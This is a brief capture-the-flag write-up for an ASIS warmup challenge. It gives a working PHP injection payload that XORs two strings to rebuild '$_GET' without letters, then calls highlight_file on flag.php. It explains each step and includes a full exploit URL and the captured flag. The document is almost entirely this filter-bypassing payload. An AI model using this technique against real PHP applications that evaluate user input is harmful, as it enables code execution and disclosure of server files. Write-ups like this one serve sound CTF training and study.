**Challenge:** http://69.90.132.196:5003/?view-source

Payload: <code>$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=highlight_file&__=flag.php</code>

Explaining:
  - <code>$_="`{{{"^"?<>/";</code> | Result of xor operation: <code>$_ = "_GET"</code>
  - <code>${$_}[_](${$_}[__]);</code> | <code>$_GET[_]($_GET[__])</code>
  - Eval function will be: <code>eval(highlight_file('flag.php'))</code>

**<a href="http://69.90.132.196:5003/?warmup=$_=%22`{{{%22^%22?%3C%3E/%22;${$_}[_](${$_}[__]);&_=highlight_file&__=flag.php" >Get the flag</a>**

**Flag**: ASIS{w4rm_up_y0ur_br4in}
